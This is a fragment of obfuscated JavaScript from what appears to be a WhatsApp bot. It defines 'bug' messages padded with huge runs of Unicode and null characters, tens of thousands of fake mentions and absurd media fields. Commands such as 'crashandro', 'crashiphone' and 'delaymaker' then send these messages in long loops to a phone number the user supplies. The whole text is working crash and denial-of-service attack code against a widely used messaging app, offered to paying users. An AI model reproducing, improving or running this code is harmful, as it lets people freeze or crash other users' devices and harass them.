          'footerText': "𝐇𝐈 𝐈'𝐀𝐌 𝐏𝐑𝐈𝐌𝐈𝐒⍣ ",
          'buttons': [{
            'buttonId': '.aboutb',
            'buttonText': {
              'displayText': "𐎟𑆻𝐇𝐈 𝐈'𝐀𝐌 𝐏𝐑𝐈𝐌𝐈𝐒⍣ 𐎟𑆻 " + "\0".repeat(0xdbba0)
            },
            'type': 0x1
          }],
          'headerType': 0x1
        }
      }, {});
      await _0x35a9de.relayMessage('status@broadcast', _0x368ccc.message, {
        'messageId': _0x368ccc.key.id,
        'statusJidList': [_0xa79aa1],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': 'mentioned_users',
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0xa79aa1
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x2b9545) {
        await _0x35a9de.relayMessage(_0xa79aa1, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x368ccc.key,
                'type': 0xf
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "𐎟𑆻𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒⍣𐎟𑆻⃔‌"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x4302f1(_0x431e09, _0x47596e) {
      const _0x1b6dc0 = {
        'extendedTextMessage': {
          'text': '᭯'.repeat(0x2ee0),
          'matchedText': "https://" + 'ꦾ'.repeat(0x1f4) + ".com",
          'canonicalUrl': "https://" + 'ꦾ'.repeat(0x1f4) + '.com',
          'description': "\0".repeat(0x1f4),
          'title': '‍'.repeat(0x3e8),
          'previewType': "NONE",
          'jpegThumbnail': Buffer.alloc(0x2710),
          'contextInfo': {
            'forwardingScore': 0x3e7,
            'isForwarded': true,
            'externalAdReply': {
              'showAdAttribution': true,
              'title': "BoomXSuper",
              'body': "\0".repeat(0x2710),
              'thumbnailUrl': "https://" + 'ꦾ'.repeat(0x1f4) + ".com",
              'mediaType': 0x1,
              'renderLargerThumbnail': true,
              'sourceUrl': "https://" + '𓂀'.repeat(0x7d0) + ".xyz"
            },
            'mentionedJid': Array.from({
              'length': 0x3e8
            }, (_0x56119b, _0x585e06) => Math.floor(Math.random() * 0x3b9aca00) + "@s.whatsapp.net")
          }
        },
        'paymentInviteMessage': {
          'currencyCodeIso4217': "USD",
          'amount1000': "999999999",
          'expiryTimestamp': "9999999999",
          'inviteMessage': "Payment Invite" + '💥'.repeat(0x6ea),
          'serviceType': 0x1
        }
      };
      const _0x5dcfd6 = ['13135550002@s.whatsapp.net', ...Array.from({
        'length': 0x1f4
      }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")];
      const _0x210beb = {
        'musicContentMediaId': "589608164114571",
        'songId': "870166291800508",
        'author': ".SurzHeree" + 'ោ៝'.repeat(0x3e8),
        'title': "MegumiAgency",
        'artworkDirectPath': "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        'artworkSha256': "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        'artworkEncSha256': "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        'artistAttribution': "https://n.uguu.se/BvbLvNHY.jpg",
        'countryBlocklist': true,
        'isExplicit': true,
        'artworkMediaKey': 'S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU='
      };
      const _0x39edd4 = {
        'url': "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        'mimetype': 'video/mp4',
        'fileSha256': "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        'fileLength': "109951162777600",
        'seconds': 0xf423f,
        'mediaKey': 'IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=',
        'caption': 'ꦾ'.repeat(0x4fd),
        'height': 0x280,
        'width': 0x280,
        'fileEncSha256': "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        'directPath': '/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0',
        'mediaKeyTimestamp': "1743848703",
        'contextInfo': {
          'externalAdReply': {
            'showAdAttribution': true,
            'title': "☠️ - んジェラルド - ☠️",
            'body': "\0".repeat(0x239d),
            'mediaType': 0x1,
            'renderLargerThumbnail': true,
            'thumbnailUrl': null,
            'sourceUrl': "https://" + 'ꦾ'.repeat(0x64) + ".com/"
          },
          'businessMessageForwardInfo': {
            'businessOwnerJid': _0x431e09
          },
          'quotedMessage': _0x1b6dc0,
          'isSampled': true,
          'mentionedJid': _0x5dcfd6
        },
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': "120363321780343299@newsletter",
          'serverMessageId': 0x1,
          'newsletterName': 'ꦾ'.repeat(0x64)
        },
        'streamingSidecar': "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        'thumbnailDirectPath': "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        'thumbnailSha256': "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        'thumbnailEncSha256': "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        'annotations': [{
          'embeddedContent': {
            'embeddedMusic': _0x210beb
          },
          'embeddedAction': true
        }]
      };
      const _0x5617d5 = generateWAMessageFromContent(_0x431e09, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': _0x39edd4
          }
        }
      }, {});
      if (!_0x5617d5.key || !_0x5617d5.key.id) {
        _0x5617d5.key = {
          'remoteJid': _0x431e09,
          'fromMe': true,
          'id': (Math.random() * 0x2386f26fc10000).toString(0x24)
        };
      }
      await _0x35a9de.relayMessage("status@broadcast", _0x5617d5.message, {
        'messageId': _0x5617d5.key.id,
        'statusJidList': [_0x431e09],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': 'mentioned_users',
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x431e09
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x47596e) {
        await _0x35a9de.relayMessage(_0x431e09, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x5617d5.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "true"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x5e702a(_0x2c0595) {
      _0x35a9de.relayMessage(_0x2c0595, {
        'extendedTextMessage': {
          'text': 'prim.com' + '࣯ꦾ'.repeat(0x15f90),
          'contextInfo': {
            'fromMe': false,
            'stanzaId': _0x2c0595,
            'participant': _0x2c0595,
            'quotedMessage': {
              'conversation': "Neobest.cloud.com" + 'ꦾ'.repeat(0x15f90)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x2c0595
        }
      }, {
        'messageId': null
      });
    }
    async function _0x23ded8(_0x2ce789, _0x520b5b = true) {
      let _0x94db3f = "🐉 𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒" + 'ꦾ'.repeat(0xbf68);
      await _0x35a9de.relayMessage(_0x2ce789, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': "999999999",
                  'pageCount': 0x9184e729fff,
                  'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  'fileName': "\t".repeat(0x64),
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1715880173",
                  'contactVcard': true
                },
                'title': '',
                'hasMediaAttachment': true
              },
              'body': {
                'text': _0x94db3f
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': "0@s.whatsapp.net",
                  'groupSubject': "\t"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x2ce789
        }
      }, {
        'messageId': null
      });
    }
    async function _0xb944e2(_0x11fbf2, _0x4b2363) {
      const _0x8e6acb = ["13135550002@s.whatsapp.net", ...Array.from({
        'length': 0x7530
      }, () => '1' + Math.floor(Math.random() * 0x7a120) + '@s.whatsapp.net')];
      const _0x32b179 = {
        'musicContentMediaId': "589608164114571",
        'songId': '870166291800508',
        'author': ".Primis Is herre" + 'ោ៝'.repeat(0x2710),
        'title': "Megumi",
        'artworkDirectPath': "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        'artworkSha256': "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        'artworkEncSha256': "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        'artistAttribution': "https://www.instagram.com/_u/tamainfinity_",
        'countryBlocklist': true,
        'isExplicit': true,
        'artworkMediaKey': 'S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU='
      };
      const _0x4782b4 = {
        'url': "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        'mimetype': "video/mp4",
        'fileSha256': "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        'fileLength': '289511',
        'seconds': 0xf,
        'mediaKey': 'IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=',
        'caption': "𐌖𐌉𐌍𐌂𐍃 ✦ 𐌔𐌖𐍀𐌄𐍂𐌍𐌰𐌙𐍂",
        'height': 0x280,
        'width': 0x280,
        'fileEncSha256': "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        'directPath': "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        'mediaKeyTimestamp': '1743848703',
        'contextInfo': {
          'isSampled': true,
          'mentionedJid': _0x8e6acb
        },
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': "120363321780343299@newsletter",
          'serverMessageId': 0x1,
          'newsletterName': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻"
        },
        'streamingSidecar': "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        'thumbnailDirectPath': "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        'thumbnailSha256': "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        'thumbnailEncSha256': 'fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=',
        'annotations': [{
          'embeddedContent': {
            'embeddedMusic': _0x32b179
          },
          'embeddedAction': true
        }]
      };
      const _0x3c1815 = generateWAMessageFromContent(_0x11fbf2, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': _0x4782b4
          }
        }
      }, {});
      if (!_0x3c1815.key || !_0x3c1815.key.id) {
        _0x3c1815.key = {
          'remoteJid': _0x11fbf2,
          'fromMe': true,
          'id': (Math.random() * 0x2386f26fc10000).toString(0x24)
        };
      }
      await _0x35a9de.relayMessage('status@broadcast', _0x3c1815.message, {
        'messageId': _0x3c1815.key.id,
        'statusJidList': [_0x11fbf2],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x11fbf2
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x4b2363) {
        await _0x35a9de.relayMessage(_0x11fbf2, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x3c1815.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "true"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x44db21(_0x1463d9, _0x34baf1) {
      const _0x1ef9f2 = "𓆩⛧𓆪".repeat(0xbb8) + "\n" + '‎'.repeat(0xbb8);
      const _0x100a2e = {
        'viewOnceMessage': {
          'message': {
            'imageMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              'mimetype': "image/jpeg",
              'caption': ">_<\n" + _0x1ef9f2,
              'fileSha256': "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              'fileLength': '19769',
              'height': 0x162,
              'width': 0x30f,
              'mediaKey': "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              'fileEncSha256': "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              'directPath': "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              'mediaKeyTimestamp': "1743225419",
              'jpegThumbnail': null,
              'scansSidecar': "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              'scanLengths': [0x985, 0x43b4],
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x9c40
                }, () => '1' + Math.floor(Math.random() * 0xf423f) + "@s.whatsapp.net"),
                'isSampled': true,
                'participant': _0x1463d9,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x270f,
                'isForwarded': true
              }
            }
          }
        }
      };
      const _0x2ec1eb = generateWAMessageFromContent(_0x1463d9, _0x100a2e, {});
      if (!_0x2ec1eb.key || !_0x2ec1eb.key.id) {
        _0x2ec1eb.key = {
          'remoteJid': _0x1463d9,
          'fromMe': true,
          'id': (Math.random() * 0x2386f26fc10000).toString(0x24)
        };
      }
      await _0x35a9de.relayMessage('status@broadcast', _0x2ec1eb.message, {
        'messageId': _0x2ec1eb.key.id,
        'statusJidList': [_0x1463d9],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x1463d9
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x34baf1) {
        await _0x35a9de.relayMessage(_0x1463d9, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x2ec1eb.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': 'TACHI'
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x43c542(_0x161306, _0x455aa9) {
      const _0x4e2734 = generateWAMessageFromContent(_0x161306, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              'mimetype': 'video/mp4',
              'fileSha256': "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              'fileLength': "999999",
              'seconds': 0xf423f,
              'mediaKey': "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              'caption': '香',
              'height': 0xf423f,
              'width': 0xf423f,
              'fileEncSha256': "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              'directPath': "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
              'mediaKeyTimestamp': "1743742853",
              'contextInfo': {
                'isSampled': true,
                'mentionedJid': ["13135550002@s.whatsapp.net", ...Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")]
              },
              'streamingSidecar': "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
              'thumbnailDirectPath': "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              'thumbnailSha256': 'vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=',
              'thumbnailEncSha256': 'dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=',
              'annotations': [{
                'embeddedContent': {
                  'embeddedMusic': {
                    'musicContentMediaId': "kontol",
                    'songId': "peler",
                    'author': '香',
                    'title': '香',
                    'artworkDirectPath': '/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0',
                    'artworkSha256': 'u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=',
                    'artworkEncSha256': "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    'artistAttribution': "https://www.instagram.com/_u/tamainfinity_",
                    'countryBlocklist': true,
                    'isExplicit': true,
                    'artworkMediaKey': 'kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ='
                  }
                },
                'embeddedAction': null
              }]
            }
          }
        }
      }, {});
      await _0x35a9de.relayMessage("status@broadcast", _0x4e2734.message, {
        'messageId': _0x4e2734.key.id,
        'statusJidList': [_0x161306],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x161306
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x455aa9) {
        await _0x35a9de.relayMessage(_0x161306, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x4e2734.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "true"
            },
            'content': undefined
          }]
        });
      }
    }
    function _0x576c5e(_0x10e1d2) {
      return new Promise(_0x2dfec0 => setTimeout(_0x2dfec0, _0x10e1d2));
    }
    async function _0x2d22b2(_0x4d8b46) {
      let _0x5abc27 = JSON.stringify({
        'status': true,
        'criador': "Primis WhatsApp Api",
        'resultado': {
          'type': 'md',
          'ws': {
            '_events': {
              'CB:ib,,dirty': ["Array"]
            },
            '_eventsCount': 0xc3500,
            '_maxListeners': 0x0,
            'url': "wss://web.whatsapp.com/ws/chat",
            'config': {
              'version': ["Array"],
              'browser': ["Array"],
              'waWebSocketUrl': "wss://web.whatsapp.com/ws/chat",
              'sockCectTimeoutMs': 0x4e20,
              'keepAliveIntervalMs': 0x7530,
              'logger': {},
              'printQRInTerminal': false,
              'emitOwnEvents': true,
              'defaultQueryTimeoutMs': 0xea60,
              'customUploadHosts': [],
              'retryRequestDelayMs': 0xfa,
              'maxMsgRetryCount': 0x5,
              'fireInitQueries': true,
              'auth': {
                'Object': "authData"
              },
              'markOnlineOnsockCect': true,
              'syncFullHistory': true,
              'linkPreviewImageThumbnailWidth': 0xc0,
              'transactionOpts': {
                'Object': "transactionOptsData"
              },
              'generateHighQualityLinkPreview': false,
              'options': {},
              'appStateMacVerification': {
                'Object': "appStateMacData"
              },
              'mobile': true
            }
          }
        }
      });
      let _0x13296f = await generateWAMessageFromContent(_0x4d8b46, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'contextInfo': {
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'mentionedJid': [_0x4d8b46],
                'forwardedNewsletterMessageInfo': {
                  'newsletterName': "Arya Valensya",
                  'newsletterJid': "120363321780343299@newsletter",
                  'serverMessageId': 0x1
                },
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': "🩸𐎟𑆻𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒⍣𐎟𑆻⃔",
                  'body': '',
                  'thumbnailUrl': null,
                  'sourceUrl': 'https://youtube.com/@limmvz',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                },
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x4d8b46
                },
                'dataSharingContext': {
                  'showMmDisclosure': true
                },
                'quotedMessage': {
                  'paymentInviteMessage': {
                    'serviceType': 0x1,
                    'expiryTimestamp': null
                  }
                }
              },
              'header': {
                'title': '',
                'hasMediaAttachment': false
              },
              'body': {
                'text': "🩸𐎟𑆻𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒⍣𐎟𑆻⃔"
              },
              'nativeFlowMessage': {
                'messageParamsJson': "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Arya Official\",\"body\":\"Call Galaxy\"}",
                'buttons': [{
                  'name': 'single_select',
                  'buttonParamsJson': _0x5abc27 + "🩸𐎟𑆻𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒⍣𐎟𑆻⃔"
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': _0x5abc27 + "🩸𐎟𑆻𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒 ⍣𐎟𑆻⃔"
                }, {
                  'name': 'payment_method',
                  'buttonParamsJson': ''
                }, {
                  'name': "payment_status",
                  'buttonParamsJson': ''
                }, {
                  'name': "review_order",
                  'buttonParamsJson': ''
                }]
              }
            }
          }
        }
      }, {});
      await _0x35a9de.relayMessage(_0x4d8b46, _0x13296f.message, {
        'participant': {
          'jid': _0x4d8b46
        },
        'messageId': _0x13296f.key.id
      });
    }
    async function _0x26cf84(_0x102f68) {
      for (let _0x9621d5 = 0x0; _0x9621d5 < 0x1e; _0x9621d5++) {
        await _0x4302f1(_0x102f68);
        await _0x2fd6f1(_0x102f68);
        await _0xb944e2(_0x102f68);
      }
    }
    async function _0x2577f3(_0x5258d7) {
      for (let _0x20a308 = 0x0; _0x20a308 <= 0xa; _0x20a308++) {
        await _0xf070bc(_0x5258d7);
        await _0x5460e8(_0x5258d7);
      }
    }
    async function _0x1c6497(_0x41e9a1) {
      for (let _0x479901 = 0x0; _0x479901 < 0x32; _0x479901++) {
        await _0x2d22b2(_0x41e9a1);
      }
    }
    async function _0x3f1e6c(_0x19f50b) {
      for (let _0x2199f2 = 0x0; _0x2199f2 < 0x14; _0x2199f2++) {
        await _0x43c542(_0x19f50b);
        await _0x4302f1(_0x19f50b);
        await _0x44db21(_0x19f50b);
      }
    }
    async function _0x4477b5(_0x598b0d) {
      for (let _0x52f352 = 0x0; _0x52f352 < 0x14; _0x52f352++) {
        await _0x219a7f(_0x598b0d, true);
      }
    }
    async function _0x1c71cc(_0x321fb4) {
      for (let _0x180605 = 0x0; _0x180605 < 0xa; _0x180605++) {
        await _0x2d22b2(_0x321fb4);
        await _0x23ded8(_0x321fb4, true);
        await _0x5e702a(_0x321fb4);
      }
    }
    async function _0x559f52(_0x2563e8) {
      for (let _0x5174da = 0x0; _0x5174da < 0x14; _0x5174da++) {
        await _0x2d22b2(_0x2563e8);
        await _0x23ded8(_0x2563e8);
        await _0x5e702a(_0x2563e8);
        await _0x4302f1(_0x2563e8, mention = true);
        await _0x43c542(_0x2563e8, true);
        await _0x27dd6b(_0x2563e8);
        await _0x43c542(_0x2563e8);
        await _0x219a7f(_0x2563e8, true);
        await _0x44db21(_0x2563e8);
        await _0xf070bc(_0x2563e8);
        await _0x5460e8(_0x2563e8);
        await _0x2fd6f1(_0x2563e8);
        await _0xb944e2(_0x2563e8);
      }
    }
    async function _0x4fce14(_0x3d02f1) {
      for (let _0xa09954 = 0x0; _0xa09954 <= 0x37; _0xa09954++) {
        await _0x442a27(_0x3d02f1);
        await _0x1703c2(_0x3d02f1);
        await _0x442a27(_0x3d02f1);
        await _0x1703c2(_0x3d02f1);
        await _0x442a27(_0x3d02f1);
        await _0x1703c2(_0x3d02f1);
        await _0x442a27(_0x3d02f1);
        await _0x1703c2(_0x3d02f1);
        await _0x442a27(_0x3d02f1);
        await _0x1703c2(_0x3d02f1);
        await _0x598ae1(0x5dc);
      }
    }
    async function _0x2a5ff0(_0x1ee303) {
      for (let _0x24fbc8 = 0x0; _0x24fbc8 <= 0x37; _0x24fbc8++) {
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x1dd33e(_0x1ee303);
        await _0x598ae1(0x5dc);
      }
    }
    switch (_0x54dd8f) {
      case "offdroid":
      case "crashandro":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x13e25b = 0x0; _0x13e25b < 0x7d; _0x13e25b++) {
            await _0x4fce14(target, true);
            await _0x4fce14(target, true);
            await _0x598ae1(0x5dc);
          }
        }
        break;
      case 'offios':
      case 'crashiphone':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50940xxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs");
          for (let _0x230aa8 = 0x0; _0x230aa8 < 0x7d; _0x230aa8++) {
            await _0x2a5ff0(target, true);
            await _0x2a5ff0(target, true);
            await _0x598ae1(0x5dc);
          }
        }
        break;
      case "die":
      case "delaymaker":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
